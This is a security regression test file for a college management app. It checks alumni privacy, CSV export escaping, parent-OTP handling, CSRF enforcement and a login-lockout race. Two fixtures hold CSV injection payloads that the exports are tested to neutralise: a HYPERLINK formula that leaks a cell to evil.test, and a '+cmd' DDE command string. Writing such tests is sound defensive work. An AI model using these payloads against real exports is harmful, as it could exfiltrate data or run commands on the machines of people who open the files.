/**
 * Regression tests for the security / QA audit (see SECURITY_QA_REPORT.md).
 * Each block reproduces one confirmed finding and fails on the code before
 * its fix:
 *
 *  A. Alumni data exposure — student email / phone / roll number to alumni;
 *     alumni contacts ignoring their own privacy settings; hidden-email
 *     directory search oracle; alumni CSV export.
 *  B. CSV / formula injection in exports.
 *  C. Day-scholar outing parent OTP sent to a number the student typed.
 *  D. Mass outpass invented a parent number ('9876543210').
 *  E. Gate pass double submit created duplicate passes.
 *  F. Faculty saw other years' gate passes of the same section letter.
 *  G. CSRF double-submit skipped when the X-CSRF-Token header was missing.
 *  H. Alumni job search dropped the student's "deadline not passed" rule.
 *  I. Parallel wrong passwords raced past the account lockout (runs last:
 *     its failures feed the per-IP throttle).
 */
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { startServer, PASSWORD } from './helpers.js';
import { csvCell, toCsv } from '../src/utils/csv.js';

let ctx;
let admin, hod, principal, student, student2, alumni, alumniPublic, facultyY3, studentY1, studentY3;
const later = (days) => new Date(Date.now() + days * 86400000).toISOString();

async function mk(over) {
  const u = await ctx.createUser(over);
  return { u, ...(await ctx.loginWeb(u)) };
}

async function makeAlumni(over = {}, profile = {}) {
  const a = await mk({ role: 'alumni', department: 'CSE', ...over });
  await ctx.models.AlumniProfile.create({
    user: a.u._id, gradYear: 2020, company: 'Acme', designation: 'Engineer', location: 'Chennai',
    isVerified: true, mentorshipAvailable: true, maxActiveMentees: 5, domains: ['software_engineering'], ...profile,
  });
  return a;
}

before(async () => {
  ctx = await startServer();
  admin = await mk({ role: 'admin', name: 'Audit Admin' });
  hod = await mk({ role: 'hod', name: 'Audit HOD', department: 'CSE', employeeId: 'AU-H' });
  principal = await mk({ role: 'principal', name: 'Audit Principal', employeeId: 'AU-P' });
  student = await mk({ name: 'Priya Student', email: 'priya.student@test.edu', phone: '9111111111', rollNo: 'AU-S1', department: 'CSE', section: 'A', year: 3, semester: 5, parentPhone: '9222222222', stayType: 'hosteler' });
  student2 = await mk({ name: 'Ravi Student', email: 'ravi.student@test.edu', phone: '9333333333', rollNo: 'AU-S2', department: 'CSE', section: 'A', year: 3, semester: 5, parentPhone: '9444444444', stayType: 'hosteler' });
  // Default privacy: email "mentees", phone "hidden".
  alumni = await makeAlumni({ name: 'Private Alumna', email: 'private.alumna@alumni.test', phone: '9555555555' });
  alumniPublic = await makeAlumni({ name: 'Public Alumnus', email: 'public.alumnus@alumni.test', phone: '9666666666' }, { privacy: { email: 'public', phone: 'public' } });
  facultyY3 = await mk({ role: 'faculty', name: 'Third Year In-Charge', department: 'CSE', section: 'A', inChargeYear: 3, inChargeSemester: 5, teachingYears: [3], employeeId: 'AU-F3' });
  studentY1 = await mk({ name: 'First Year A', rollNo: 'AU-Y1', department: 'CSE', section: 'A', year: 1, semester: 1, parentPhone: '9777777777', stayType: 'hosteler' });
  studentY3 = await mk({ name: 'Third Year A', rollNo: 'AU-Y3', department: 'CSE', section: 'A', year: 3, semester: 5, parentPhone: '9888888888', stayType: 'hosteler' });
});
after(async () => {
  await ctx.stop();
});

const noStudentContact = (u, label) => {
  assert.ok(u && u.name, `${label}: the student is still identified by name`);
  for (const f of ['email', 'phone', 'rollNo', 'employeeId']) assert.equal(u[f], undefined, `${label}: student ${f} must not reach an alumnus`);
};

// ── A. Alumni data exposure ────────────────────────────────────────

test('A1 mentorship: an alumnus never receives a student’s email / phone / roll number; the alumnus’s contacts follow their privacy', async () => {
  const created = await ctx.request('POST', '/mentorship-requests', { token: student.token, body: { alumni: String(alumni.u._id), domain: 'software_engineering', message: 'Guidance on backend careers' } });
  assert.equal(created.status, 201, JSON.stringify(created.body));
  // Student's own view of a pending request: email is "mentees" (not yet a mentee) and phone "hidden".
  assert.equal(created.body.alumni.email, undefined, 'not a mentee yet → the alumna’s email is hidden');
  assert.equal(created.body.alumni.phone, undefined, 'phone is hidden by default');
  assert.equal(created.body.student.email, 'priya.student@test.edu', 'the student sees their own record');

  const list = await ctx.request('GET', '/mentorship-requests', { token: alumni.token });
  assert.equal(list.status, 200);
  const row = list.body.items.find((r) => r._id === created.body._id);
  noStudentContact(row.student, 'alumni request list');
  assert.equal(row.alumni.email, 'private.alumna@alumni.test', 'the alumna sees her own record');

  noStudentContact((await ctx.request('GET', `/mentorship-requests/${created.body._id}`, { token: alumni.token })).body.student, 'alumni request detail');

  const accepted = await ctx.request('PATCH', `/mentorship-requests/${created.body._id}`, { token: alumni.token, body: { status: 'accepted' } });
  assert.equal(accepted.status, 200, JSON.stringify(accepted.body));
  noStudentContact(accepted.body.student, 'accept response');

  // Now a mentee: the "mentees"-level email is visible, the "hidden" phone is not.
  const mine = await ctx.request('GET', `/mentorship-requests/${created.body._id}`, { token: student.token });
  assert.equal(mine.body.alumni.email, 'private.alumna@alumni.test');
  assert.equal(mine.body.alumni.phone, undefined);

  // Internal staff still see the student's contact details.
  const staff = await ctx.request('GET', `/mentorship-requests/${created.body._id}`, { token: admin.token });
  assert.equal(staff.body.student.email, 'priya.student@test.edu');
});

test('A2 jobs: the posting alumnus sees applicants without contact details; a public alumnus’s email is shown', async () => {
  const job = await ctx.request('POST', '/alumni/jobs', {
    token: alumniPublic.token,
    body: { title: 'Backend Intern', company: 'Acme', location: 'Chennai', type: 'internship', workMode: 'hybrid', description: 'Build APIs with Node.js and MongoDB for our platform team.', applyMode: 'referral', deadline: later(20) },
  });
  assert.equal(job.status, 201, JSON.stringify(job.body));
  const apply = await ctx.request('POST', `/alumni/jobs/${job.body._id}/apply`, { token: student2.token, body: { note: 'Interested' } });
  assert.equal(apply.status, 201, JSON.stringify(apply.body));

  const apps = await ctx.request('GET', `/alumni/jobs/${job.body._id}/applications`, { token: alumniPublic.token });
  assert.equal(apps.status, 200);
  assert.equal(apps.body.items.length, 1);
  noStudentContact(apps.body.items[0].student, 'job applications');

  const seen = await ctx.request('GET', `/alumni/jobs/${job.body._id}`, { token: student2.token });
  assert.equal(seen.body.postedBy.email, 'public.alumnus@alumni.test', 'public email stays visible');
  assert.equal(seen.body.postedBy.rollNo, undefined);
});

test('A3 events: an alumnus organizer’s attendee list and CSV carry no student contact details; CSV cells are neutralised', async () => {
  const ev = await ctx.request('POST', '/alumni/events', {
    token: alumni.token,
    body: { title: 'Alumni Tech Talk', type: 'guest_talk', mode: 'online', startsAt: later(5), endsAt: later(5.1), description: 'A talk about building a career in backend engineering.', meetingLink: 'https://meet.example.com/talk', capacity: 10 },
  });
  assert.equal(ev.status, 201, JSON.stringify(ev.body));
  assert.equal((await ctx.request('POST', `/alumni/events/${ev.body._id}/approve`, { token: hod.token })).status, 200);
  await ctx.models.User.updateOne({ _id: student.u._id }, { $set: { name: '=HYPERLINK("http://evil.test/?"&A1,"x")' } });
  try {
    assert.equal((await ctx.request('POST', `/alumni/events/${ev.body._id}/rsvp`, { token: student.token })).body.status, 'going');

    const list = await ctx.request('GET', `/alumni/events/${ev.body._id}/attendees`, { token: alumni.token });
    assert.equal(list.status, 200);
    noStudentContact(list.body[0].user, 'attendees');

    const csv = await ctx.request('GET', `/alumni/events/${ev.body._id}/attendees?format=csv`, { token: alumni.token });
    assert.equal(csv.status, 200);
    const text = String(csv.body);
    assert.ok(!text.includes('priya.student@test.edu') && !text.includes('9111111111'), 'no student contact in the CSV');
    assert.ok(text.includes(`"'=HYPERLINK(""http://evil.test/?""&A1,""x"")"`), 'formula neutralised and quotes escaped');

    // Staff still get the full list.
    assert.equal((await ctx.request('GET', `/alumni/events/${ev.body._id}/attendees`, { token: admin.token })).body[0].user.email, 'priya.student@test.edu');
  } finally {
    await ctx.models.User.updateOne({ _id: student.u._id }, { $set: { name: 'Priya Student' } });
  }
});

test('A4 directory: searching by a hidden email finds nothing (no existence oracle); name search still works; admin may search email', async () => {
  const byEmail = await ctx.request('GET', `/alumni?search=${encodeURIComponent('private.alumna@alumni.test')}`, { token: student2.token });
  assert.equal(byEmail.status, 200);
  assert.equal(byEmail.body.items.length, 0, 'a hidden email cannot be probed through search');
  const byName = await ctx.request('GET', '/alumni?search=Private%20Alumna', { token: student2.token });
  assert.equal(byName.body.items.length, 1);
  assert.equal(byName.body.items[0].user.email, undefined);
  assert.equal(byName.body.items[0].user.rollNo, undefined);
  assert.equal((await ctx.request('GET', `/alumni?search=${encodeURIComponent('private.alumna@alumni.test')}`, { token: admin.token })).body.items.length, 1);
});

test('A5 alumni CSV export honours privacy (HOD does not get a hidden phone) and neutralises formulas', async () => {
  await ctx.models.AlumniProfile.updateOne({ user: alumni.u._id }, { $set: { company: '+cmd|"/c calc"!A0' } });
  const csv = await ctx.request('GET', '/alumni/analytics/export', { token: hod.token });
  assert.equal(csv.status, 200);
  const text = String(csv.body);
  assert.ok(!text.includes('9555555555'), 'a "hidden" phone is not exported to a HOD');
  assert.ok(text.includes('private.alumna@alumni.test'), '"mentees"-level email is staff-visible');
  assert.ok(text.includes(`"'+cmd|""/c calc""!A0"`), 'leading + neutralised, quotes escaped');
  const adminCsv = String((await ctx.request('GET', '/alumni/analytics/export', { token: admin.token })).body);
  assert.ok(adminCsv.includes('9555555555'), 'admin sees everything');
});

// ── B. CSV helper ──────────────────────────────────────────────────

test('B csvCell quotes, escapes and neutralises = + - @ tab CR', () => {
  assert.equal(csvCell('=1+1'), `"'=1+1"`);
  assert.equal(csvCell('+91 98'), `"'+91 98"`);
  assert.equal(csvCell('-2'), `"'-2"`);
  assert.equal(csvCell('@SUM(A1)'), `"'@SUM(A1)"`);
  assert.equal(csvCell('\tx'), `"'\tx"`);
  assert.equal(csvCell('a"b,c'), '"a""b,c"');
  assert.equal(csvCell(null), '""');
  assert.equal(toCsv([['a', 'b'], ['1', '2']]), '"a","b"\r\n"1","2"');
});

// ── C. Day-scholar outing OTP ──────────────────────────────────────

test('C outing: the parent OTP number is always the registered one; a typed number is ignored; none on file → 422', async () => {
  const ds = await mk({ name: 'Day Scholar', rollNo: 'AU-DS', department: 'CSE', section: 'B', year: 3, semester: 5, parentPhone: '9000000099', stayType: 'day_scholar' });
  const res = await ctx.request('POST', '/gate-pass/outing', { token: ds.token, body: { subject: 'Dentist', description: 'Dentist visit in town', parentPhone: '9123456780' } });
  assert.equal(res.status, 201, JSON.stringify(res.body));
  assert.equal(res.body.parentPhone, '9000000099', 'the OTP goes to the registered parent, not the typed number');
  assert.equal((await ctx.models.GatePass.findById(res.body._id).lean()).parentPhone, '9000000099');

  const noParent = await mk({ name: 'Day Scholar No Parent', rollNo: 'AU-DS2', department: 'CSE', section: 'B', year: 3, semester: 5, stayType: 'day_scholar' });
  const refused = await ctx.request('POST', '/gate-pass/outing', { token: noParent.token, body: { subject: 'Dentist', description: 'Dentist visit in town', parentPhone: '9123456780' } });
  assert.equal(refused.status, 422);
  assert.equal(await ctx.models.GatePass.countDocuments({ student: noParent.u._id }), 0);
});

// ── D. Mass outpass ────────────────────────────────────────────────

test('D mass outpass: a hosteller without a parent number is skipped — never given an invented number', async () => {
  const orphan = await mk({ name: 'No Parent Hosteller', rollNo: 'AU-NP', department: 'CSE', section: 'C', year: 2, semester: 3, stayType: 'hosteler' });
  const res = await ctx.request('POST', '/gate-pass/mass-approve', { token: principal.token, body: { fromDate: later(1), toDate: later(2), regarding: 'home', description: 'Semester break' } });
  assert.equal(res.status, 201, JSON.stringify(res.body));
  assert.ok(res.body.missingParentPhone >= 1);
  assert.equal(await ctx.models.GatePass.countDocuments({ student: orphan.u._id }), 0, 'no pass with a made-up parent number');
  assert.equal(await ctx.models.GatePass.countDocuments({ parentPhone: '9876543210' }), 0);
  // Clean up so later gate-pass tests start from no open pass.
  await ctx.models.GatePass.deleteMany({ 'principalReview.reason': 'Semester break' });
});

// ── E. Double submit ───────────────────────────────────────────────

test('E gate pass: parallel duplicate submissions create exactly one pass (normal and emergency)', async () => {
  const s = await mk({ name: 'Double Tap', rollNo: 'AU-DT', department: 'CSE', section: 'D', year: 3, semester: 5, parentPhone: '9000000011', stayType: 'hosteler' });
  const day = later(1).slice(0, 10);
  const body = { regarding: 'home', description: 'Weekend at home', fromDate: day, toDate: day, destination: { state: 'Tamil Nadu', district: 'Chennai', area: 'Adyar' } };
  const results = await Promise.all(Array.from({ length: 6 }, () => ctx.request('POST', '/gate-pass', { token: s.token, body })));
  assert.equal(results.filter((r) => r.status === 201).length, 1, JSON.stringify(results.map((r) => r.status)));
  assert.ok(results.every((r) => [201, 409].includes(r.status)));
  assert.equal(await ctx.models.GatePass.countDocuments({ student: s.u._id }), 1);

  const e = await mk({ name: 'Emergency Tap', rollNo: 'AU-ET', department: 'CSE', section: 'D', year: 3, semester: 5, parentPhone: '9000000012', stayType: 'hosteler' });
  const eb = { authority: 'principal', reason: 'Family emergency at home', destination: 'Madurai', leaveAt: later(0.1), expectedReturnAt: later(1) };
  const er = await Promise.all(Array.from({ length: 6 }, () => ctx.request('POST', '/gate-pass/emergency', { token: e.token, body: eb })));
  assert.equal(er.filter((r) => r.status === 201).length, 1, JSON.stringify(er.map((r) => [r.status, r.body?.message])));
  assert.equal(await ctx.models.GatePass.countDocuments({ student: e.u._id }), 1);
});

// ── F. Faculty cross-year visibility ───────────────────────────────

test('F gate pass: a 3rd-year Section A in-charge cannot view or list a 1st-year Section A pass', async () => {
  const day = later(2).slice(0, 10);
  const body = { regarding: 'home', description: 'Weekend at home', fromDate: day, toDate: day, destination: { state: 'Tamil Nadu', district: 'Chennai', area: 'Adyar' } };
  const p1 = await ctx.request('POST', '/gate-pass', { token: studentY1.token, body });
  const p3 = await ctx.request('POST', '/gate-pass', { token: studentY3.token, body });
  assert.equal(p1.status, 201, JSON.stringify(p1.body));
  assert.equal(p3.status, 201, JSON.stringify(p3.body));

  assert.equal((await ctx.request('GET', `/gate-pass/${p1.body._id}`, { token: facultyY3.token })).status, 403, 'another year’s class');
  assert.equal((await ctx.request('GET', `/gate-pass/${p3.body._id}`, { token: facultyY3.token })).status, 200, 'own class still visible');

  const list = await ctx.request('GET', '/gate-pass', { token: facultyY3.token });
  const ids = list.body.passes.map((p) => String(p._id));
  assert.ok(ids.includes(String(p3.body._id)));
  assert.ok(!ids.includes(String(p1.body._id)), 'the 1st-year pass is not in the 3rd-year queue');
});

// ── G. CSRF ────────────────────────────────────────────────────────

test('G CSRF: a cookie-carrying browser write needs a matching X-CSRF-Token; header missing or wrong → 403', async () => {
  const w = await ctx.loginWeb(await ctx.createUser({ name: 'Csrf User', department: 'CSE', section: 'A', year: 3, semester: 5 }));
  assert.ok(w.csrf, 'web sign-in issues a CSRF cookie');
  const cookie = `${w.cookie}; ${w.csrfCookie}`;
  const body = { name: 'Csrf User Renamed' };

  assert.equal((await ctx.request('PUT', '/users/me', { token: w.token, cookie, body })).status, 403, 'header missing');
  assert.equal((await ctx.request('PUT', '/users/me', { token: w.token, cookie, headers: { 'x-csrf-token': 'not-the-token' }, body })).status, 403, 'mismatch');
  assert.equal((await ctx.request('PUT', '/users/me', { token: w.token, cookie: w.cookie, body })).status, 403, 'refresh cookie alone is still a cookie credential');
  assert.equal((await ctx.request('PUT', '/users/me', { token: w.token, cookie, headers: { 'x-csrf-token': w.csrf }, body })).status, 200, 'valid pair passes');
  // No cookie at all: only a Bearer token, which a cross-site page cannot attach.
  assert.equal((await ctx.request('PUT', '/users/me', { token: w.token, body })).status, 200);
  // Token-issuing endpoints stay exempt.
  assert.equal((await ctx.request('POST', '/auth/refresh', { cookie })).status, 200);

  // The native app is unaffected.
  const m = await ctx.loginMobile(await ctx.createUser({ name: 'Mobile Csrf', department: 'CSE', section: 'A', year: 3, semester: 5 }));
  const mobile = await ctx.request('PUT', '/users/me', { token: m.token, headers: { 'x-client-platform': 'mobile', 'user-agent': 'okhttp/4.12.0' }, body: { name: 'Mobile Renamed' } });
  assert.equal(mobile.status, 200);
});

// ── H. Alumni job search ───────────────────────────────────────────

test('H jobs: a student’s search never lists a job whose deadline has passed', async () => {
  const job = await ctx.models.AlumniJob.create({
    title: 'Expired Search Target', company: 'Oldco', location: 'Chennai', type: 'internship', workMode: 'onsite',
    description: 'An internship whose deadline has already passed.', applyMode: 'referral', status: 'open',
    postedBy: alumniPublic.u._id, deadline: new Date(Date.now() - 86400000),
  });
  const res = await ctx.request('GET', '/alumni/jobs?search=Expired%20Search', { token: student2.token });
  assert.equal(res.status, 200);
  assert.ok(!res.body.items.some((j) => String(j._id) === String(job._id)), 'expired job leaked through search');
});

// ── I. Login lockout race (keep last) ──────────────────────────────

test('I login: parallel wrong passwords cannot race past the 3-strike lockout', async () => {
  const victim = await ctx.createUser({ name: 'Brute Target', email: 'brute.target@test.edu' });
  const attempts = await Promise.all(
    Array.from({ length: 8 }, () => ctx.request('POST', '/auth/login', { body: { email: victim.email, password: 'WrongPass1' } }))
  );
  const statuses = attempts.map((r) => r.status);
  assert.ok(statuses.filter((s) => s === 401).length <= 2, `at most 2 plain failures before the lock, got ${statuses}`);
  const row = await ctx.models.User.findById(victim._id).select('+failedLogins +lockUntil').lean();
  assert.ok(row.lockUntil && row.lockUntil > new Date(), 'the account is locked');
  assert.ok(row.failedLogins <= 3, `only 3 guesses were checked, got ${row.failedLogins}`);

  const right = await ctx.request('POST', '/auth/login', { body: { email: victim.email, password: PASSWORD } });
  assert.equal(right.status, 423, 'even the right password waits for the lock to expire');
});
